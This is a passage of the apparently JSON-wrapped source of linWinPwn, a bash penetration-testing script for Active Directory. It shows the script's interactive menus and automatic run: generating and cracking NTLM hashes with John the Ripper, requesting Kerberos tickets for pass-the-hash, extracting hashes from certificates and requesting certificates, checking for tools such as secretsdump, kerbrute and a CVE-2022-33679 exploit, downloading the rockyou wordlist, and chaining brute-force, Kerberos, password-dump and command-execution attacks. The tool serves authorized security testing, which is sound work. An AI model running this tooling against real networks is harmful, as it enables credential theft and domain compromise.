\"${YELLOW}[Init menu]${NC} Please choose from the following options:\"\n    echo -e \"----------------------------------------------------\"\n    echo -e \"ENTER) Launch linWinPwn in interactive mode\"\n    echo -e \"A) Authentication Menu\"\n    echo -e \"C) Configuration Menu\"\n    echo -e \"exit) Exit\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n    C)\n        config_menu\n        ;;\n\n    A)\n        auth_menu\n        ;;\n\n    \"\")\n        main_menu\n        ;;\n\n    exit)\n        exit 1\n        ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        init_menu\n        ;;\n    esac\n}\n\nauth_menu() {\n    echo -e \"\"\n    echo -e \"${YELLOW}[Auth menu]${NC} Please choose from the following options:\"\n    echo -e \"----------------------------------------------------\"\n    echo -e \"1) Generate NTLM hash of current user (requires: password) - Pass the hash\"\n    echo -e \"2) Crack NTLM hash of current user (requires: NTLM hash)\"\n    echo -e \"3) Generate TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash\"\n    echo -e \"4) Extract NTLM hash from Certificate using PKINIT (requires: pfx certificate)\"\n    echo -e \"5) Request certificate (requires: authentication)\"\n    echo -e \"6) Generate AES Key using aesKrbKeyGen (requires: password)\"\n    echo -e \"back) Go back to Init Menu\"\n    echo -e \"exit) Exit\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n    C)\n        config_menu\n        ;;\n\n    A)\n        auth_menu\n        ;;\n\n    1)\n        if [ \"${pass_bool}\" == true ]; then\n            hash_gen=\"$(iconv -f ASCII -t UTF-16LE <(printf \"%s\" \"$password\") | $(which openssl) dgst -md4 | cut -d \" \" -f 2)\"\n            echo -e \"${GREEN}[+] NTLM hash generated:${NC} ${hash_gen}\"\n            echo -e \"${GREEN}[+] Re-run linWinPwn to use hash instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u '${user}' -H ${hash_gen}\"\n        else\n            echo -e \"${RED}[-] Error! Requires password...${NC}\"\n        fi\n        auth_menu\n        ;;\n\n    2)\n        if [ ! -f \"${john}\" ]; then\n            echo -e \"${RED}[-] Please verify the installation of john${NC}\"\n        else\n            if [ \"${hash_bool}\" == true ]; then\n                echo \"$hash\" | cut -d \":\" -f 2 >\"${output_dir}/Credentials/ntlm_hash\"\n                echo -e \"${CYAN}[*] Cracking NTLM hash using john the ripper${NC}\"\n                run_command \"$john ${output_dir}/Credentials/ntlm_hash --format=NT --wordlist=$pass_wordlist\" | tee \"${output_dir}/Credentials/johnNTLM_output_${dc_domain}\"\n                john_out=$($john \"${output_dir}/Credentials/ntlm_hash\" --format=NT --show)\n                if [[ \"${john_out}\" == *\"1 password\"* ]]; then\n                    password_cracked=$(echo \"$john_out\" | cut -d \":\" -f 2 | cut -d \" \" -f 1)\n                    echo -e \"${GREEN}[+] NTLM hash successfully cracked:${NC} $password_cracked\"\n                    echo -e \"${GREEN}[+] Re-run linWinPwn to use password instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u '${user}' -p ${password_cracked}\"\n                else\n                    echo -e \"${RED}[-] Failed to crack NTLM hash${NC}\"\n                fi\n            else\n                echo -e \"${RED}[-] Error! Requires NTLM hash...${NC}\"\n            fi\n        fi\n        auth_menu\n        ;;\n\n    3)\n        if [ ! -f \"${impacket_getTGT}\" ]; then\n            echo -e \"${RED}[-] getTGT.py not found! Please verify the installation of impacket${NC}\"\n        else\n            if [ \"${pass_bool}\" == true ] || [ \"${hash_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n                current_dir=$(pwd)\n                cd \"${output_dir}/Credentials\" || exit\n                echo -e \"${CYAN}[*] Requesting TGT for current user${NC}\"\n                run_command \"${impacket_getTGT} ${argument_imp} -dc-ip ${dc_ip}\" | grep -v \"Impacket\" | sed '/^$/d' | tee \"${output_dir}/Credentials/getTGT_output_${dc_domain}\"\n                cd \"${current_dir}\" || exit\n                if [ -f \"${output_dir}/Credentials/${user}.ccache\" ]; then\n                    krb_ticket=\"${output_dir}/Credentials/${user}.ccache\"\n                    echo -e \"${GREEN}[+] TGT generated successfully:${NC} '$krb_ticket'\"\n                    echo -e \"${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u '${user}' -K '${krb_ticket}'\"\n                else\n                    echo -e \"${RED}[-] Failed to generate TGT${NC}\"\n                fi\n            else\n                echo -e \"${RED}[-] Error! Requires password, NTLM hash or AES key...${NC}\"\n            fi\n        fi\n        auth_menu\n        ;;\n\n    4)\n        if [[ ! -f \"${certipy}\" ]]; then\n            echo -e \"${RED}[-] Please verify the installation of certipy${NC}\"\n        else\n            if [[ ${cert_bool} == false ]]; then\n                echo -e \"${BLUE}[*] Please specify location of certificate file:${NC}\"\n                read -rp \">> \" pfxcert </dev/tty\n                while [ ! -s \"${pfxcert}\" ]; do\n                    echo -e \"${RED}Invalid pfx file.${NC} Please specify location of certificate file:\"\n                    read -rp \">> \" pfxcert </dev/tty\n                done\n                if [[ ${pfxpass} == \"\" ]]; then\n                    echo -e \"${BLUE}[*] Please specify password of certificate file (press Enter if no password):${NC}\"\n                    read -rp \">> \" pfxpass </dev/tty\n                fi\n            fi\n            echo -e \"${CYAN}[*] Extracting NTLM hash from certificate using PKINIT${NC}\"\n            pkinit_auth\n        fi\n        echo -e \"\"\n        auth_menu\n        ;;\n\n    5)\n        if [[ ! -f \"${certipy}\" ]]; then\n            echo -e \"${RED}[-] Please verify the installation of certipy${NC}\"\n        else\n            if [ \"${pass_bool}\" == true ] || [ \"${hash_bool}\" == true ] || [ \"${aeskey_bool}\" == true ] || [ \"${kerb_bool}\" == true ]; then\n                ne_adcs_enum\n                current_dir=$(pwd)\n                cd \"${output_dir}/Credentials\" || exit\n                i=0\n                for pki_server in $pki_servers; do\n                    i=$((i + 1))\n                    pki_ca=$(echo -e \"$pki_cas\" | sed 's/ /\\n/g' | sed -n ${i}p)\n                    run_command \"${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -ca \\\"${pki_ca//SPACE/ }\\\" -template User\" | tee \"${output_dir}/Credentials/certipy_reqcert_output_${dc_domain}.txt\"\n                done\n                cd \"${current_dir}\" || exit\n                if [ -f \"${output_dir}/Credentials/${user}.pfx\" ]; then\n                    pfxcert=\"${output_dir}/Credentials/${user}.pfx\"\n                    pfxpass=\"\"\n                    echo -e \"${GREEN}[+] PFX Certificate requested successfully:${NC} '${output_dir}/Credentials/${user}.pfx'\"\n                    $(which openssl) pkcs12 -in \"${output_dir}/Credentials/${user}.pfx\" -out \"${output_dir}/Credentials/${user}.pem\" -nodes -passin pass:\"\"\n                    if [ -f \"${output_dir}/Credentials/${user}.pem\" ]; then\n                        pem_cert=\"${output_dir}/Credentials/${user}.pem\"\n                        echo -e \"${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} '${pem_cert}'\"\n                    fi\n                    echo -e \"${GREEN}[+] Re-run linWinPwn to use certificate instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u '${user}' -C '${pfxcert}'\"\n                else\n                    echo -e \"${RED}[-] Failed to request certificate${NC}\"\n                fi\n            else\n                echo -e \"${RED}[-] Error! Requires password, NTLM hash, AES key or Kerberos ticket...${NC}\"\n            fi\n        fi\n        auth_menu\n        ;;\n\n    6) \n        if [[ ! -f \"${aesKrbKeyGen}\" ]]; then\n            echo -e \"${RED}[-] Please verify the installation of aesKrbKeyGen.py${NC}\"\n        else\n            if [ \"${pass_bool}\" == true ]; then\n                aes_gen=$(\"${python3}\" \"${aesKrbKeyGen}\" -domain \"${domain}\" -u \"'${user}'\" -pass \"${password}\")\n                aes_key=$(echo -e \"${aes_gen}\" | grep \"AES256\" | cut -d \" \" -f 4)\n                if [[ ! \"${aes_key}\" == \"\" ]]; then \n                    echo -e \"${GREEN}[+] AES Keys generated:${NC} ${aes_gen}\"\n                    echo -e \"${GREEN}[+] Re-run linWinPwn to use AES key instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u '${user}' -A ${aes_key}\"\n                else\n                    echo -e \"${RED}[-] Error generating AES Keys${NC}\"\n                fi\n            else\n                echo -e \"${RED}[-] Error! Requires password...${NC}\"\n            fi\n        fi\n        auth_menu\n        ;;\n    back)\n        init_menu\n        ;;\n\n    exit)\n        exit 1\n        ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        auth_menu\n        ;;\n    esac\n}\n\nconfig_menu() {\n    mkdir -p \"${output_dir}/Config\"\n    echo -e \"\"\n    echo -e \"${YELLOW}[Config menu]${NC} Please choose from the following options:\"\n    echo -e \"------------------------------------------------------\"\n    echo -e \"1) Check installation of tools and dependencies\"\n    echo -e \"2) Synchronize time with Domain Controller (requires root)\"\n    echo -e \"3) Add Domain Controller's IP and Domain to /etc/hosts (requires root)\"\n    echo -e \"4) Update resolv.conf to define Domain Controller as DNS server (requires root)\"\n    echo -e \"5) Update krb5.conf to define realm and KDC for Kerberos (requires root)\"\n    echo -e \"6) Download default username and password wordlists (non-kali machines)\"\n    echo -e \"7) Change users wordlist file\"\n    echo -e \"8) Change passwords wordlist file\"\n    echo -e \"9) Change attacker's IP\"\n    echo -e \"10) Switch between LDAP (port 389) and LDAPS (port 636)\"\n    echo -e \"11) Show session information\"\n    echo -e \"back) Go back to Init Menu\"\n    echo -e \"exit) Exit\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n    1)\n        echo -e \"\"\n        if [ ! -f \"${impacket_findDelegation}\" ]; then echo -e \"${RED}[-] impacket's findDelegation is not installed${NC}\"; else echo -e \"${GREEN}[+] impacket's findDelegation is installed${NC}\"; fi\n        if [ ! -f \"${impacket_GetUserSPNs}\" ]; then echo -e \"${RED}[-] impacket's GetUserSPNs is not installed${NC}\"; else echo -e \"${GREEN}[+] impacket's GetUserSPNs is installed${NC}\"; fi\n        if [ ! -f \"${impacket_secretsdump}\" ]; then echo -e \"${RED}[-] impacket's secretsdump is not installed${NC}\"; else echo -e \"${GREEN}[+] impacket's secretsdump is installed${NC}\"; fi\n        if [ ! -f \"${impacket_GetNPUsers}\" ]; then echo -e \"${RED}[-] impacket's GetNPUsers is not installed${NC}\"; else echo -e \"${GREEN}[+] impacket's GetNPUsers is installed${NC}\"; fi\n        if [ ! -f \"${impacket_getTGT}\" ]; then echo -e \"${RED}[-] impacket's getTGT is not installed${NC}\"; else echo -e \"${GREEN}[+] impacket's getTGT is installed${NC}\"; fi\n        if [ ! -f \"${impacket_goldenPac}\" ]; then echo -e \"${RED}[-] impacket's goldenPac is not installed${NC}\"; else echo -e \"${GREEN}[+] impacket's goldenPac is installed${NC}\"; fi\n        if [ ! -f \"${impacket_rpcdump}\" ]; then echo -e \"${RED}[-] impacket's rpcdump is not installed${NC}\"; else echo -e \"${GREEN}[+] impacket's rpcdump is installed${NC}\"; fi\n        if [ ! -f \"${impacket_reg}\" ]; then echo -e \"${RED}[-] impacket's reg is not installed${NC}\"; else echo -e \"${GREEN}[+] impacket's reg is installed${NC}\"; fi\n        if [ ! -f \"${impacket_ticketer}\" ]; then echo -e \"${RED}[-] impacket's ticketer is not installed${NC}\"; else echo -e \"${GREEN}[+] impacket's ticketer is installed${NC}\"; fi\n        if [ ! -f \"${impacket_getST}\" ]; then echo -e \"${RED}[-] impacket's getST is not installed${NC}\"; else echo -e \"${GREEN}[+] impacket's getST is installed${NC}\"; fi\n        if [ ! -f \"${impacket_raiseChild}\" ]; then echo -e \"${RED}[-] impacket's raiseChild is not installed${NC}\"; else echo -e \"${GREEN}[+] impacket's raiseChild is installed${NC}\"; fi\n        if [ ! -f \"${impacket_changepasswd}\" ]; then echo -e \"${RED}[-] impacket's changepasswd is not installed${NC}\"; else echo -e \"${GREEN}[+] impacket's changepasswd is installed${NC}\"; fi\n        if [ ! -f \"${impacket_describeticket}\" ]; then echo -e \"${RED}[-] impacket's describeTicket is not installed${NC}\"; else echo -e \"${GREEN}[+] impacket's describeticket is installed${NC}\"; fi\n        if [ ! -f \"${bloodhound}\" ]; then echo -e \"${RED}[-] bloodhound is not installed${NC}\"; else echo -e \"${GREEN}[+] bloodhound is installed${NC}\"; fi\n        if [ ! -f \"${ldapdomaindump}\" ]; then echo -e \"${RED}[-] ldapdomaindump is not installed${NC}\"; else echo -e \"${GREEN}[+] ldapdomaindump is installed${NC}\"; fi\n        if [ ! -f \"${netexec}\" ]; then echo -e \"${RED}[-] netexec is not installed${NC}\"; else echo -e \"${GREEN}[+] netexec is installed${NC}\"; fi\n        if [ ! -f \"${john}\" ]; then echo -e \"${RED}[-] john is not installed${NC}\"; else echo -e \"${GREEN}[+] john is installed${NC}\"; fi\n        if [ ! -f \"${smbmap}\" ]; then echo -e \"${RED}[-] smbmap is not installed${NC}\"; else echo -e \"${GREEN}[+] smbmap is installed${NC}\"; fi\n        if [ ! -f \"${nmap}\" ]; then echo -e \"${RED}[-] nmap is not installed${NC}\"; else echo -e \"${GREEN}[+] nmap is installed${NC}\"; fi\n        if [ ! -f \"${adidnsdump}\" ]; then echo -e \"${RED}[-] adidnsdump is not installed${NC}\"; else echo -e \"${GREEN}[+] adidnsdump is installed${NC}\"; fi\n        if [ ! -f \"${certi_py}\" ]; then echo -e \"${RED}[-] certi_py is not installed${NC}\"; else echo -e \"${GREEN}[+] certi_py is installed${NC}\"; fi\n        if [ ! -f \"${certipy}\" ]; then echo -e \"${RED}[-] certipy is not installed${NC}\"; else echo -e \"${GREEN}[+] certipy is installed${NC}\"; fi\n        if [ ! -f \"${ldeep}\" ]; then echo -e \"${RED}[-] ldeep is not installed${NC}\"; else echo -e \"${GREEN}[+] ldeep is installed${NC}\"; fi\n        if [ ! -f \"${pre2k}\" ]; then echo -e \"${RED}[-] pre2k is not installed${NC}\"; else echo -e \"${GREEN}[+] pre2k is installed${NC}\"; fi\n        if [ ! -f \"${certsync}\" ]; then echo -e \"${RED}[-] certsync is not installed${NC}\"; else echo -e \"${GREEN}[+] certsync is installed${NC}\"; fi\n        if [ ! -f \"${windapsearch}\" ]; then echo -e \"${RED}[-] windapsearch is not installed${NC}\"; else echo -e \"${GREEN}[+] windapsearch is installed${NC}\"; fi\n        if [ ! -x \"${windapsearch}\" ]; then echo -e \"${RED}[-] windapsearch is not executable${NC}\"; else echo -e \"${GREEN}[+] windapsearch is executable${NC}\"; fi\n        if [ ! -f \"${enum4linux_py}\" ]; then echo -e \"${RED}[-] enum4linux-ng is not installed${NC}\"; else echo -e \"${GREEN}[+] enum4linux-ng is installed${NC}\"; fi\n        if [ ! -x \"${enum4linux_py}\" ]; then echo -e \"${RED}[-] enum4linux-ng is not executable${NC}\"; else echo -e \"${GREEN}[+] enum4linux-ng is executable${NC}\"; fi\n        if [ ! -f \"${kerbrute}\" ]; then echo -e \"${RED}[-] kerbrute is not installed${NC}\"; else echo -e \"${GREEN}[+] kerbrute is installed${NC}\"; fi\n        if [ ! -x \"${kerbrute}\" ]; then echo -e \"${RED}[-] kerbrute is not executable${NC}\"; else echo -e \"${GREEN}[+] kerbrute is executable${NC}\"; fi\n        if [ ! -f \"${targetedKerberoast}\" ]; then echo -e \"${RED}[-] targetedKerberoast is not installed${NC}\"; else echo -e \"${GREEN}[+] targetedKerberoast is installed${NC}\"; fi\n        if [ ! -x \"${targetedKerberoast}\" ]; then echo -e \"${RED}[-] targetedKerberoast is not executable${NC}\"; else echo -e \"${GREEN}[+] targetedKerberoast is executable${NC}\"; fi\n        if [ ! -f \"${CVE202233679}\" ]; then echo -e \"${RED}[-] CVE-2022-33679 is not installed${NC}\"; else echo -e \"${GREEN}[+] CVE-2022-33679 is installed${NC}\"; fi\n        if [ ! -x \"${CVE202233679}\" ]; then echo -e \"${RED}[-] CVE-2022-33679 is not executable${NC}\"; else echo -e \"${GREEN}[+] CVE-2022-33679 is executable${NC}\"; fi\n        if [ ! -f \"${silenthound}\" ]; then echo -e \"${RED}[-] silenthound is not installed${NC}\"; else echo -e \"${GREEN}[+] silenthound is installed${NC}\"; fi\n        if [ ! -f \"${silenthound}\" ]; then echo -e \"${RED}[-] silenthound is not installed${NC}\"; else echo -e \"${GREEN}[+] silenthound is installed${NC}\"; fi\n        if [ ! -f \"${donpapi}\" ]; then echo -e \"${RED}[-] DonPAPI is not installed${NC}\"; else echo -e \"${GREEN}[+] DonPAPI is installed${NC}\"; fi\n        if [ ! -f \"${hekatomb}\" ]; then echo -e \"${RED}[-] HEKATOMB is not installed${NC}\"; else echo -e \"${GREEN}[+] hekatomb is installed${NC}\"; fi\n        if [ ! -f \"${FindUncommonShares}\" ]; then echo -e \"${RED}[-] FindUncommonShares is not installed${NC}\"; else echo -e \"${GREEN}[+] FindUncommonShares is installed${NC}\"; fi\n        if [ ! -x \"${FindUncommonShares}\" ]; then echo -e \"${RED}[-] FindUncommonShares is not executable${NC}\"; else echo -e \"${GREEN}[+] FindUncommonShares is executable${NC}\"; fi\n        if [ ! -f \"${ExtractBitlockerKeys}\" ]; then echo -e \"${RED}[-] ExtractBitlockerKeys is not installed${NC}\"; else echo -e \"${GREEN}[+] ExtractBitlockerKeys is installed${NC}\"; fi\n        if [ ! -x \"${ExtractBitlockerKeys}\" ]; then echo -e \"${RED}[-] ExtractBitlockerKeys is not executable${NC}\"; else echo -e \"${GREEN}[+] ExtractBitlockerKeys is executable${NC}\"; fi\n        if [ ! -f \"${ldapconsole}\" ]; then echo -e \"${RED}[-] ldapconsole is not installed${NC}\"; else echo -e \"${GREEN}[+] ldapconsole is installed${NC}\"; fi\n        if [ ! -x \"${ldapconsole}\" ]; then echo -e \"${RED}[-] ldapconsole is not executable${NC}\"; else echo -e \"${GREEN}[+] ldapconsole is executable${NC}\"; fi\n        if [ ! -f \"${pyLDAPmonitor}\" ]; then echo -e \"${RED}[-] pyLDAPmonitor is not installed${NC}\"; else echo -e \"${GREEN}[+] pyLDAPmonitor is installed${NC}\"; fi\n        if [ ! -x \"${pyLDAPmonitor}\" ]; then echo -e \"${RED}[-] pyLDAPmonitor is not executable${NC}\"; else echo -e \"${GREEN}[+] pyLDAPmonitor is executable${NC}\"; fi\n        if [ ! -f \"${LDAPWordlistHarvester}\" ]; then echo -e \"${RED}[-] LDAPWordlistHarvester is not installed${NC}\"; else echo -e \"${GREEN}[+] LDAPWordlistHarvester is installed${NC}\"; fi\n        if [ ! -x \"${LDAPWordlistHarvester}\" ]; then echo -e \"${RED}[-] LDAPWordlistHarvester is not executable${NC}\"; else echo -e \"${GREEN}[+] LDAPWordlistHarvester is executable${NC}\"; fi\n        if [ ! -f \"${rdwatool}\" ]; then echo -e \"${RED}[-] rdwatool is not installed${NC}\"; else echo -e \"${GREEN}[+] rdwatool is installed${NC}\"; fi\n        if [ ! -f \"${manspider}\" ]; then echo -e \"${RED}[-] manspider is not installed${NC}\"; else echo -e \"${GREEN}[+] manspider is installed${NC}\"; fi\n        if [ ! -f \"${coercer}\" ]; then echo -e \"${RED}[-] coercer is not installed${NC}\"; else echo -e \"${GREEN}[+] coercer is installed${NC}\"; fi\n        if [ ! -f \"${bloodyad}\" ]; then echo -e \"${RED}[-] bloodyad is not installed${NC}\"; else echo -e \"${GREEN}[+] bloodyad is installed${NC}\"; fi\n        if [ ! -f \"${aced}\" ]; then echo -e \"${RED}[-] aced is not installed${NC}\"; else echo -e \"${GREEN}[+] aced is installed${NC}\"; fi\n        if [ ! -f \"${sccmhunter}\" ]; then echo -e \"${RED}[-] sccmhunter is not installed${NC}\"; else echo -e \"${GREEN}[+] sccmhunter is installed${NC}\"; fi\n        if [ ! -f \"${krbjack}\" ]; then echo -e \"${RED}[-] krbjack is not installed${NC}\"; else echo -e \"${GREEN}[+] krbjack is installed${NC}\"; fi\n        if [ ! -f \"${ldapper}\" ]; then echo -e \"${RED}[-] ldapper is not installed${NC}\"; else echo -e \"${GREEN}[+] ldapper is installed${NC}\"; fi\n        if [ ! -f \"${orpheus}\" ]; then echo -e \"${RED}[-] orpheus is not installed${NC}\"; else echo -e \"${GREEN}[+] orpheus is installed${NC}\"; fi\n        if [ ! -f \"${adalanche}\" ]; then echo -e \"${RED}[-] adalanche is not installed${NC}\"; else echo -e \"${GREEN}[+] adalanche is installed${NC}\"; fi\n        if [ ! -x \"${adalanche}\" ]; then echo -e \"${RED}[-] adalanche is not executable${NC}\"; else echo -e \"${GREEN}[+] adalanche is executable${NC}\"; fi\n        if [ ! -f \"${mssqlrelay}\" ]; then echo -e \"${RED}[-] mssqlrelay is not installed${NC}\"; else echo -e \"${GREEN}[+] mssqlrelay is installed${NC}\"; fi\n        if [ ! -f \"${pygpoabuse}\" ]; then echo -e \"${RED}[-] pygpoabuse is not installed${NC}\"; else echo -e \"${GREEN}[+] pygpoabuse is installed${NC}\"; fi\n        if [ ! -x \"${pygpoabuse}\" ]; then echo -e \"${RED}[-] pygpoabuse is not executable${NC}\"; else echo -e \"${GREEN}[+] pygpoabuse is executable${NC}\"; fi\n        if [ ! -f \"${GPOwned}\" ]; then echo -e \"${RED}[-] GPOwned is not installed${NC}\"; else echo -e \"${GREEN}[+] GPOwned is installed${NC}\"; fi\n        if [ ! -x \"${GPOwned}\" ]; then echo -e \"${RED}[-] GPOwned is not executable${NC}\"; else echo -e \"${GREEN}[+] GPOwned is executable${NC}\"; fi\n        if [ ! -f \"${privexchange}\" ]; then echo -e \"${RED}[-] privexchange is not installed${NC}\"; else echo -e \"${GREEN}[+] privexchange is installed${NC}\"; fi\n        if [ ! -x \"${privexchange}\" ]; then echo -e \"${RED}[-] privexchange is not executable${NC}\"; else echo -e \"${GREEN}[+] privexchange is executable${NC}\"; fi\n        if [ ! -f \"${RunFinger}\" ]; then echo -e \"${RED}[-] RunFinger is not installed${NC}\"; else echo -e \"${GREEN}[+] RunFinger is installed${NC}\"; fi\n        if [ ! -x \"${RunFinger}\" ]; then echo -e \"${RED}[-] RunFinger is not executable${NC}\"; else echo -e \"${GREEN}[+] RunFinger is executable${NC}\"; fi\n        if [ ! -f \"${LDAPNightmare}\" ]; then echo -e \"${RED}[-] LDAPNightmare is not installed${NC}\"; else echo -e \"${GREEN}[+] LDAPNightmare is installed${NC}\"; fi\n        if [ ! -x \"${LDAPNightmare}\" ]; then echo -e \"${RED}[-] LDAPNightmare is not executable${NC}\"; else echo -e \"${GREEN}[+] LDAPNightmare is executable${NC}\"; fi\n        if [ ! -f \"${adPEAS}\" ]; then echo -e \"${RED}[-] adPEAS is not installed${NC}\"; else echo -e \"${GREEN}[+] adPEAS is installed${NC}\"; fi\n        if [ ! -f \"${breads}\" ]; then echo -e \"${RED}[-] breads is not installed${NC}\"; else echo -e \"${GREEN}[+] breads is installed${NC}\"; fi\n        if [ ! -f \"${ADCheck}\" ]; then echo -e \"${RED}[-] ADCheck is not installed${NC}\"; else echo -e \"${GREEN}[+] ADCheck is installed${NC}\"; fi\n        if [ ! -f \"${smbclientng}\" ]; then echo -e \"${RED}[-] smbclientng is not installed${NC}\"; else echo -e \"${GREEN}[+] smbclientng is installed${NC}\"; fi\n        if [ ! -f \"${ldapnomnom}\" ]; then echo -e \"${RED}[-] ldapnomnom is not installed${NC}\"; else echo -e \"${GREEN}[+] ldapnomnom is installed${NC}\"; fi\n        if [ ! -x \"${ldapnomnom}\" ]; then echo -e \"${RED}[-] ldapnomnom is not executable${NC}\"; else echo -e \"${GREEN}[+] ldapnomnom is executable${NC}\"; fi\n        if [ ! -f \"${godap}\" ]; then echo -e \"${RED}[-] godap is not installed${NC}\"; else echo -e \"${GREEN}[+] godap is installed${NC}\"; fi\n        if [ ! -x \"${godap}\" ]; then echo -e \"${RED}[-] godap is not executable${NC}\"; else echo -e \"${GREEN}[+] godap is executable${NC}\"; fi\n        if [ ! -f \"${mssqlpwner }\" ]; then echo -e \"${RED}[-] mssqlpwner  is not installed${NC}\"; else echo -e \"${GREEN}[+] mssqlpwner  is installed${NC}\"; fi\n        config_menu\n        ;;\n\n    2)\n        ntp_update\n        config_menu\n        ;;\n\n    3)\n        etc_hosts_update\n        config_menu\n        ;;\n\n    4)\n        etc_resolv_update\n        config_menu\n        ;;\n\n    5)\n        etc_krb5conf_update\n        config_menu\n        ;;\n\n    6)\n        echo -e \"\"\n        sudo mkdir -p \"${wordlists_dir} \"\n        sudo chown -R \"$(whoami)\" \"${wordlists_dir}\"\n        wget -q \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz\" -O \"${wordlists_dir}/rockyou.txt.tar.gz\"\n        gunzip \"${wordlists_dir}/rockyou.txt.tar.gz\"\n        tar xf \"${wordlists_dir}/rockyou.txt.tar\" -C \"${wordlists_dir}/\"\n        chmod 644 \"${wordlists_dir}/rockyou.txt\"\n        /bin/rm \"${wordlists_dir}/rockyou.txt.tar\"\n        wget -q \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt\" -O \"${wordlists_dir}/cirt-default-usernames.txt\"\n        pass_wordlist=\"${wordlists_dir}/rockyou.txt\"\n        user_wordlist=\"${wordlists_dir}/xato-net-10-million-usernames.txt\"\n        echo -e \"${GREEN}[+] Default username and password wordlists downloaded${NC}\"\n        config_menu\n        ;;\n\n    7)\n        echo -e \"${BLUE}[*] Please specify new users wordlist file:${NC}\"\n        read -rp \">> \" user_wordlist </dev/tty\n        echo -e \"${GREEN}[+] Users wordlist file updated${NC}\"\n        config_menu\n        ;;\n\n    8)\n        echo -e \"${BLUE}[*] Please specify new passwords wordlist file:${NC}\"\n        read -rp \">> \" pass_wordlist </dev/tty\n        echo -e \"${GREEN}[+] Passwords wordlist file updated${NC}\"\n        config_menu\n        ;;\n\n    9)\n        echo \"\"\n        set_attackerIP\n        config_menu\n        ;;\n\n    10)\n        echo \"\"\n        if [ \"${ldaps_bool}\" == false ]; then\n            ldaps_bool=true\n            echo -e \"${GREEN}[+] Switched to using LDAPS on port 636${NC}\"\n\n        else\n            ldaps_bool=false\n            echo -e \"${GREEN}[+] Switched to using LDAP on port 389${NC}\"\n        fi\n        config_menu\n        ;;\n\n    11)\n        echo \"\"\n        print_info\n        config_menu\n        ;;\n\n    back)\n        init_menu\n        ;;\n\n    exit)\n        exit 1\n        ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        config_menu\n        ;;\n    esac\n}\n\nmain_menu() {\n    parse_users\n    parse_servers\n    echo -e \"\"\n    echo -e \"${PURPLE}[Main menu]${NC} Please choose from the following options:\"\n    echo -e \"-----------------------------------------------------\"\n    echo -e \"1) Run DNS Enumeration using adidnsdump\"\n    echo -e \"2) Active Directory Enumeration Menu\"\n    echo -e \"3) ADCS Enumeration Menu\"\n    echo -e \"4) Brute Force Attacks Menu\"\n    echo -e \"5) Kerberos Attacks Menu\"\n    echo -e \"6) SMB shares Enumeration Menu\"\n    echo -e \"7) Vulnerability Checks Menu\"\n    echo -e \"8) MSSQL Enumeration Menu\"\n    echo -e \"9) Password Dump Menu\"\n    echo -e \"10) AD Objects or Attributes Modification Menu\"\n    echo -e \"11) Command Execution Menu\"\n    echo -e \"back) Go back to Init Menu\"\n    echo -e \"exit) Exit\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n\n    1)\n        /bin/rm \"${output_dir}/DomainRecon/dns_records_${dc_domain}.csv\" 2>/dev/null\n        dns_enum\n        main_menu\n        ;;\n\n    2)\n        ad_menu\n        ;;\n\n    3)\n        adcs_menu\n        ;;\n\n    4)\n        bruteforce_menu\n        ;;\n\n    5)\n        kerberos_menu\n        ;;\n\n    6)\n        shares_menu\n        ;;\n\n    7)\n        vulns_menu\n        ;;\n\n    8)\n        mssql_menu\n        ;;\n\n    9)\n        pwd_menu\n        ;;\n\n    10)\n        modif_menu\n        ;;\n\n    11)\n        cmdexec_menu\n        ;;\n\n    back)\n        init_menu\n        ;;\n\n    exit)\n        exit 1\n        ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        echo -e \"\"\n        main_menu\n        ;;\n    esac\n}\n\nmain() {\n    print_banner\n    prepare\n    print_info\n    authenticate\n    echo -e \"\"\n    if [ \"${interactive_bool}\" == true ]; then\n        init_menu\n    else\n        parse_users\n        parse_servers\n        dns_enum\n        echo -e \"${GREEN}[+] Start: Active Directory Enumeration${NC}\"\n        echo -e \"${GREEN}---------------------------------------${NC}\"\n        echo -e \"\"\n        ad_enum\n        echo -e \"${GREEN}[+] Start: ADCS Enumeration${NC}\"\n        echo -e \"${GREEN}---------------------------${NC}\"\n        echo -e \"\"\n        adcs_enum\n        echo -e \"${GREEN}[+] Start: User and password Brute force Attacks${NC}\"\n        echo -e \"${GREEN}------------------------------------------------${NC}\"\n        echo -e \"\"\n        bruteforce\n        echo -e \"${GREEN}[+] Start: Kerberos-based Attacks${NC}\"\n        echo -e \"${GREEN}----------------------------------${NC}\"\n        echo -e \"\"\n        kerberos\n        echo -e \"${GREEN}[+] Start: Network Shares Scan${NC}\"\n        echo -e \"${GREEN}------------------------------${NC}\"\n        echo -e \"\"\n        scan_shares\n        echo -e \"${GREEN}[+] Start: Vulnerability Checks${NC}\"\n        echo -e \"${GREEN}-------------------------------${NC}\"\n        echo -e \"\"\n        vuln_checks\n        echo -e \"${GREEN}[+] Start: MSSQL Enumeration${NC}\"\n        echo -e \"${GREEN}----------------------------${NC}\"\n        echo -e \"\"\n        mssql_checks\n        echo -e \"\"\n        echo -e \"${GREEN}[+] Automatic enumeration has completed. Output folder is: ${output_dir}${NC}\"\n        echo -e \"${GREEN}---------------------------------------------------------${NC}\"\n\n    fi\n}\n\nmain\n"
        }
      ]
    }
  ]
}